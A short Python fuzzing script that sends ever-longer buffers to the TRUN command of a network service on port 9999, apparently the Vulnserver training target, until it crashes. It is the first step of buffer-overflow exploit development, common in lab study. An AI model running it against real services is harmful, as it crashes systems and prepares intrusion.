#!/usr/bin/python3
import sys, socket
from time import sleep

buffer = b"A" * 100
rhost = "192.168.10.6"
rport = 9999

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((rhost, rport))
        
        s.send((b'TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer += b"A" * 100
        
    except:
        print (f"Fuzzing crashed at {str(len(buffer))}")
        sys.exit()
